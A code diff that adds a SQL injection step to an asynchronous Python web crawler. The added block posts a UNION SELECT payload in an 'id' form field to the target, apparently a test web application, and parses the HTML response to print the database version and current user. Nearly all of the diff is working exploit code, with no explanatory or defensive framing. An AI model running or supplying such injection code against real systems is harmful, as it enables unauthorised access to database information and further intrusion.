@@ -120,6 +120,25 @@ async def crawl(root):
     response = await client.fetch(target, headers=request_headers)
     dump_response(response, verbose)
 
+    # attempt injection
+    post_data = {
+        'id': "-1' UNION SELECT @@version, user() #",
+        'Submit': "Submit",
+    }
+    body = urllib.parse.urlencode(post_data)
+    response = await client.fetch(
+                   target, method='POST',
+                   headers=request_headers, body=body)
+    dump_response(response, verbose)
+
+    dom = Soup(response.body.decode(), 'lxml')
+    token = dom.pre
+    data = [p.split(":")[1].strip()
+            for p in token.children
+            if str(p).find("name") > -1]
+    for x in zip(["version", "user"], data):
+        print(x)
+
     client.close()
 
 
